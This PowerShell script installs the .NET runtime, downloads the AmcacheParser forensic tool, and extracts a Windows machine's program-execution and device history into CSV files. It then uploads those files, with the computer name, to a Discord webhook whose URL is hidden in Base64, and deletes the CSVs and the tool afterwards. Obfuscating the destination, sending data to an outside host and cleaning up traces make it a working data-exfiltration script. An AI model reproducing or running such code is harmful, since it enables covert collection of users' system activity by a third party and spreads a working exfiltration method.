$runtimeUrl      = "https://aka.ms/dotnet/9.0/dotnet-runtime-win-x64.exe"
$runtimeInstaller = "$env:TEMP\dotnet-runtime-installer.exe"

Write-Host "Downloading .NET Runtime ..."
Invoke-WebRequest -Uri $runtimeUrl -OutFile $runtimeInstaller -UseBasicParsing

Write-Host "Installing .NET Runtime ..."
$install = Start-Process -FilePath $runtimeInstaller `
    -ArgumentList "/install", "/quiet", "/norestart" `
    -Wait -PassThru

Remove-Item $runtimeInstaller -ErrorAction SilentlyContinue

if ($install.ExitCode -ne 0 -and $install.ExitCode -ne 3010) {
    Write-Host "Runtime-Installation fehlgeschlagen (Exit $($install.ExitCode))."
    Read-Host "Druecke Enter zum Beenden"
    exit 1
}
Write-Host "Runtime installiert."

$url        = "https://download.ericzimmermanstools.com/net9/AmcacheParser.zip"
$zipPath    = "$env:TEMP\AmcacheParser.zip"
$extractTo  = "C:\"

Write-Host "Downloading AmcacheParser.zip ..."
Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing

Write-Host "Extracting to $extractTo ..."
Expand-Archive -Path $zipPath -DestinationPath $extractTo -Force

Write-Host "Done. Files extracted to $extractTo"
Remove-Item $zipPath

$exePath   = "C:\AmcacheParser.exe"
$hivePath  = "C:\Windows\AppCompat\Programs\Amcache.hve"
$outputDir = "C:\"

Write-Host "Running AmcacheParser ..."
& $exePath -f $hivePath --csv $outputDir

Write-Host "Fertig. CSV-Dateien wurden in $outputDir erstellt."

# CSV-Dateien per Discord Webhook senden
$webhookUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4ODUwNjU5NDIyNzUyMzYzNC9wRjl1SVVHRXl6MElDdGQxZUpKdXF4eTR0Z2VuNHNYYlhoc1pnMkZPUE5iT19fTDN0blFRM2RVZ3V0cjFNakFNWmpFYQ=="))
$csvFiles   = @(Get-ChildItem -Path $outputDir -Filter "*Amcache*.csv") |
    Where-Object { $_.Name -match "UnassociatedFileEntries|DriveBinaries|DevicePnps" }
$pcName     = $env:COMPUTERNAME
$timestamp  = Get-Date -Format "dd.MM.yyyy HH:mm:ss"

Write-Host "Sende Dateien an Webhook ..."

$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"

$bodyStream = New-Object System.IO.MemoryStream

$enc = [System.Text.Encoding]::UTF8

# payload_json part
$payloadJson = '{"content":"**PC:** ' + $pcName + '\n**Zeit:** ' + $timestamp + '"}'
$partHeader  = "--$boundary${LF}Content-Disposition: form-data; name=`"payload_json`"${LF}Content-Type: application/json${LF}${LF}$payloadJson${LF}"
$bodyStream.Write($enc.GetBytes($partHeader), 0, $enc.GetByteCount($partHeader))

# file parts
$i = 0
foreach ($file in $csvFiles) {
    $fileBytes   = [System.IO.File]::ReadAllBytes($file.FullName)
    $fileHeader  = "--$boundary${LF}Content-Disposition: form-data; name=`"files[$i]`"; filename=`"$($file.Name)`"${LF}Content-Type: text/csv${LF}${LF}"
    $headerBytes = $enc.GetBytes($fileHeader)
    $bodyStream.Write($headerBytes, 0, $headerBytes.Length)
    $bodyStream.Write($fileBytes,   0, $fileBytes.Length)
    $crlf = $enc.GetBytes($LF)
    $bodyStream.Write($crlf, 0, $crlf.Length)
    $i++
}

$closing = "--$boundary--$LF"
$bodyStream.Write($enc.GetBytes($closing), 0, $enc.GetByteCount($closing))

Invoke-RestMethod -Uri $webhookUrl `
    -Method Post `
    -ContentType "multipart/form-data; boundary=$boundary" `
    -Body $bodyStream.ToArray() | Out-Null

$bodyStream.Dispose()
Write-Host "Nachricht mit allen Dateien gesendet."

# Aufräumen: alle 6 CSV-Dateien löschen
Write-Host "Lösche CSV-Dateien ..."
Get-ChildItem -Path $outputDir -Filter "*Amcache*.csv" | Remove-Item -Force -ErrorAction SilentlyContinue

# AmcacheParser.exe, .dll und .json löschen
Write-Host "Lösche AmcacheParser-Dateien ..."
Get-ChildItem -Path $outputDir -Filter "AmcacheParser*" |
    Where-Object { $_.Extension -in ".exe", ".dll", ".json" } |
    Remove-Item -Force -ErrorAction SilentlyContinue

Write-Host "Bereinigung abgeschlossen."

Read-Host "`nDruecke Enter zum Beenden"
